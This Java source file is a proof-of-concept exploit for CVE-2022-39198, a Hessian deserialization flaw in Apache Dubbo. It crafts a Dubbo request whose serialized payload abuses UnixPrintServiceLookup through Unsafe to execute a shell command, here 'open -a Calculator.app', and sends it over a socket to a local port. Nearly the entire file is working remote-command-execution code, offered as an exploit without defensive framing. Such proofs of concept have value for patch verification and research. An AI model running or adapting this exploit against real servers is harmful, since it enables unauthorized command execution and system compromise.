package org.example;

import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.alibaba.fastjson.JSONObject;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.example.utils.Reflections;
import sun.misc.Unsafe;
import sun.print.UnixPrintServiceLookup;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

/**
 * @author Whoopsunix
 *
 * CVE-2022-39198
 */
public class CVE_2022_39198 {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] header = new byte[16];
        Bytes.short2bytes((short) 0xdabb, header);
        header[2] = (byte) ((byte) 0x80 | 2);
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        Hessian2Output mH2o = (Hessian2Output) Reflections.getFieldValue(out, "mH2o");
        mH2o.getSerializerFactory().setAllowNonSerializable(true);


/////////############################################

        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        Object unix = unsafe.allocateInstance(UnixPrintServiceLookup.class);
        Reflections.setFieldValue(unix, "osname", "hack");
//        String cmds = "touch /tmp/1.txt";
        String cmds = "open -a Calculator.app";



        Reflections.setFieldValue(unix, "lpcFirstCom", new String[]{cmds, cmds, cmds});

        JSONObject jo = new JSONObject();
        jo.put("oops", unix);

/////////############################################

        out.writeUTF("xxxxx");
        // 选择一个存在的（三选一）
        // 1
//        out.writeUTF("org.apache.dubbo.registry.RegistryService");
//        out.writeUTF("0.0.0");
        // 2
//        out.writeUTF("org.example.api.DemoService");
//        out.writeUTF("1.0");
        // 3
        out.writeUTF("org.apache.dubbo.metadata.MetadataService");
        out.writeUTF("1.0.0");

        out.writeUTF("$echo");
        out.writeUTF("Ljava/lang/Object;");
        out.writeObject(jo);
        HashMap hkhash = new HashMap();
        hkhash.put("aaa", "bbb");
        out.writeObject(hkhash);

        out.flushBuffer();
        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
        byte[] bytes = byteArrayOutputStream.toByteArray();
        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();


    }
}
